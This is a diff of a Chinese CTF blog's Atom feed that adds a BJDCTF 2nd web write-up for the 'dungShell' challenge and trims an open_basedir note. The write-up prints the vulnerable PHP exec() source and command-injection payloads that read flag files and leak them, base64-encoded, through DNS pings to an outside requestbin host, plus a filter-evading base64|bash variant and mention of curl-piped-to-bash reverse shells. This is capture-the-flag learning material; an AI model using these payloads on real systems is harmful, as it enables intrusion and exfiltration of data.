@@ -1,4 +1,90 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-03-26T14:14:06+08:00</updated><id>http://localhost:4000/atom.xml</id><title type="html">Glyuan’s Blog</title><subtitle>flag{f14g_1s_n0t_h3r3}</subtitle><author><name>Asinose</name></author><entry><title type="html">BJDCTF 2nd Web Writeup</title><link href="http://localhost:4000/writeups/2020/03/23/BJDCTF-2nd-Web/" rel="alternate" type="text/html" title="BJDCTF 2nd Web Writeup" /><published>2020-03-23T00:00:00+08:00</published><updated>2020-03-23T00:00:00+08:00</updated><id>http://localhost:4000/writeups/2020/03/23/BJDCTF-2nd-Web</id><content type="html" xml:base="http://localhost:4000/writeups/2020/03/23/BJDCTF-2nd-Web/">&lt;p&gt;上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-03-26T14:35:02+08:00</updated><id>http://localhost:4000/atom.xml</id><title type="html">Glyuan’s Blog</title><subtitle>flag{f14g_1s_n0t_h3r3}</subtitle><author><name>Asinose</name></author><entry><title type="html">BJDCTF 2nd Web Writeup</title><link href="http://localhost:4000/writeups/2020/03/23/BJDCTF-2nd-Web-(copy)/" rel="alternate" type="text/html" title="BJDCTF 2nd Web Writeup" /><published>2020-03-23T00:00:00+08:00</published><updated>2020-03-23T00:00:00+08:00</updated><id>http://localhost:4000/writeups/2020/03/23/BJDCTF-2nd-Web%20(copy)</id><content type="html" xml:base="http://localhost:4000/writeups/2020/03/23/BJDCTF-2nd-Web-(copy)/">&lt;p&gt;上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;h1 id=&quot;dungshell&quot;&gt;dungShell&lt;/h1&gt;
+
+&lt;h2 id=&quot;题目描述&quot;&gt;题目描述&lt;/h2&gt;
+
+&lt;p&gt;提示写到脸上了，有.swp文件。&lt;/p&gt;
+
+&lt;h2 id=&quot;解题思路&quot;&gt;解题思路&lt;/h2&gt;
+
+&lt;p&gt;源码删减：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;error_reporting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;how can i give you source code? .swp?!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'girl_friend'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;where is P3rh4ps's girl friend ???&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$girl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'girl_friend'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/\&amp;gt;|\\\/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$girl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'just girl'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$girl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;img src='img/p3_need_beautiful_gf.png'&amp;gt; &amp;lt;!-- He is p3 --&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;//duangShell~~~~
+&lt;/span&gt;        &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$girl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;拦截形同虚设，可以用”php -r”执行PHP代码。不过没有回显，需要将结果打到DNS上。&lt;/p&gt;
+
+&lt;p&gt;扫根目录：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST：girl_friend=php -r &quot;system('ping '.substr(implode('.',scandir('/')),6,50).'.295af172a8d3ec4abf30.d.dns.requestbin.buuoj.cn');&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;读/flag：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST：girl_friend=php -r &quot;system('ping '.substr(system('bas&quot;&quot;e64 /flag'),0,50).'.295af172a8d3ec4abf30.d.dns.requestbin.buuoj.cn');&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;分两次读，解码后：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;flag{flag-is-not-here,please-find-it-by-yourself}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;不太对劲，要找真正的flag，在.bash_history里面看到了信息，然后再读：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST：girl_friend=php -r &quot;system('ping '.substr(system('bas&quot;&quot;e64 /etc/demo/P3rh4ps/love/flag'),0,50).'.46418d29ca743ab417af.d.dns.requestbin.buuoj.cn');&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;备注&quot;&gt;备注&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;后来看题解，发现我好像非预期了，.bash_history是个意外，预期思路应该是用nc命令或者curl xxxx|bash弹Shell，然后find一下flag。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;因为find命令会返回不止一行，而我的方法是利用了system()的返回，所以不太好用。当然也不是不可以，可以先将find的返回保存到变量foo中，然后echo一下${foo}。至于”$”符号的绕过，可以先将命令base64编码，传到服务器再解码，然后重定向到bash里，Payload大概长这样：&lt;/p&gt;
+
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; POST：girl_friend=php -r &quot;system('ping '.substr(system('ec&quot;&quot;ho YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg==|ba&quot;&quot;se64 -d|bash'),0,50).'.f9a0ea65a00ba5753d08.d.dns.requestbin.buuoj.cn');&quot;
+    
+ YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg== =&amp;gt; a=$(find / -name flag);echo ${a:10:15}|base64
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;不得不说，上面这个方法太蛋疼了，得整一个VPS工具。&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;</content><author><name>Asinose</name></author><category term="CTF" /><category term="Writeup" /><summary type="html">上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。</summary></entry><entry><title type="html">BJDCTF 2nd Web Writeup</title><link href="http://localhost:4000/writeups/2020/03/23/BJDCTF-2nd-Web/" rel="alternate" type="text/html" title="BJDCTF 2nd Web Writeup" /><published>2020-03-23T00:00:00+08:00</published><updated>2020-03-23T00:00:00+08:00</updated><id>http://localhost:4000/writeups/2020/03/23/BJDCTF-2nd-Web</id><content type="html" xml:base="http://localhost:4000/writeups/2020/03/23/BJDCTF-2nd-Web/">&lt;p&gt;上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。&lt;/p&gt;
 
 &lt;!-- more --&gt;
 
@@ -149,15 +235,16 @@ POST：_method=__construct&amp;amp;filter[]=system&amp;amp;server[REQUEST_METHOD
   &lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;因为find命令会返回不止一行，而我的方法是利用了system()的返回，所以不太好用。当然也不是不可以，可以先将find的返回保存到变量foo中，然后echo一下${foo}。至于”$”符号的绕过，可以先将命令base64编码，传到服务器再解码，然后重定向到bash里，Payload大概长这样：&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
 
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; POST：girl_friend=php -r &quot;system('ping '.substr(system('ec&quot;&quot;ho YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg==|ba&quot;&quot;se64 -d|bash'),0,50).'.f9a0ea65a00ba5753d08.d.dns.requestbin.buuoj.cn');&quot;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    POST：girl_friend=php -r &quot;system('ping '.substr(system('ec&quot;&quot;ho YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg==|ba&quot;&quot;se64 -d|bash'),0,50).'.f9a0ea65a00ba5753d08.d.dns.requestbin.buuoj.cn');&quot;
     
- YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg== =&amp;gt; a=$(find / -name flag);echo ${a:10:15}|base64
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;不得不说，上面这个方法太蛋疼了，得整一个VPS工具。&lt;/p&gt;
-  &lt;/li&gt;
+    YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg== =&amp;gt; a=$(find / -name flag);echo ${a:10:15}|base64
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;不得不说，上面这个方法太蛋疼了，得整一个VPS工具。&lt;/li&gt;
 &lt;/ol&gt;
 
 &lt;hr /&gt;
@@ -1765,30 +1852,4 @@ if($a != $b &amp;amp;&amp;amp; md5($a) == md5($b)){
 
 &lt;h1 id=&quot;phar&quot;&gt;phar&lt;/h1&gt;
 
-&lt;h1 id=&quot;glob&quot;&gt;glob&lt;/h1&gt;</content><author><name>Asinose</name></author><category term="Web" /></entry><entry><title type="html">grep_replace()命令执行</title><link href="http://localhost:4000/notes/2020/01/15/grep_replace()-Code-Execution/" rel="alternate" type="text/html" title="grep_replace()命令执行" /><published>2020-01-15T00:00:00+08:00</published><updated>2020-01-15T00:00:00+08:00</updated><id>http://localhost:4000/notes/2020/01/15/grep_replace()-Code-Execution</id><content type="html" xml:base="http://localhost:4000/notes/2020/01/15/grep_replace()-Code-Execution/"></content><author><name>Asinose</name></author><category term="PHP" /><category term="Execution" /></entry><entry><title type="html">绕过open_basedir限制</title><link href="http://localhost:4000/notes/2020/01/14/Bypass-open_basedir/" rel="alternate" type="text/html" title="绕过open_basedir限制" /><published>2020-01-14T00:00:00+08:00</published><updated>2020-01-14T00:00:00+08:00</updated><id>http://localhost:4000/notes/2020/01/14/Bypass%20open_basedir</id><content type="html" xml:base="http://localhost:4000/notes/2020/01/14/Bypass-open_basedir/">&lt;h1 id=&quot;open_basedir简介&quot;&gt;open_basedir简介&lt;/h1&gt;
-
-&lt;p&gt;open_basedir将php文件可访问的范围限制在指定目录树中，对于超出范围的文件，php文件无法访问。&lt;/p&gt;
-
-&lt;h1 id=&quot;设置方法&quot;&gt;设置方法&lt;/h1&gt;
-
-&lt;h2 id=&quot;在程序中设置&quot;&gt;在程序中设置&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ini_set(&quot;open_basedir&quot;, &quot;指定目录&quot;);
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;在phpini文件中设置php配置文件&quot;&gt;在php.ini文件中设置（PHP配置文件）&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;open_basedir=&quot;指定目录&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;在httpdconf文件中的directory和vritualhost设置apache配置文件&quot;&gt;在httpd.conf文件中的Directory和VritualHost设置（Apache配置文件）&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;php_admin_value open_basedir “指定目录”
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;在fastcglconf文件中设置nginx配置文件&quot;&gt;在fastcgl.conf文件中设置（Nginx配置文件）&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fastcgi_param PHP_VALUE &quot;open_basedir=指定目录&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;绕过方法&quot;&gt;绕过方法&lt;/h1&gt;</content><author><name>Asinose</name></author><category term="PHP" /><category term="Execution" /></entry></feed>
+&lt;h1 id=&quot;glob&quot;&gt;glob&lt;/h1&gt;</content><author><name>Asinose</name></author><category term="Web" /></entry><entry><title type="html">grep_replace()命令执行</title><link href="http://localhost:4000/notes/2020/01/15/grep_replace()-Code-Execution/" rel="alternate" type="text/html" title="grep_replace()命令执行" /><published>2020-01-15T00:00:00+08:00</published><updated>2020-01-15T00:00:00+08:00</updated><id>http://localhost:4000/notes/2020/01/15/grep_replace()-Code-Execution</id><content type="html" xml:base="http://localhost:4000/notes/2020/01/15/grep_replace()-Code-Execution/"></content><author><name>Asinose</name></author><category term="PHP" /><category term="Execution" /></entry></feed>
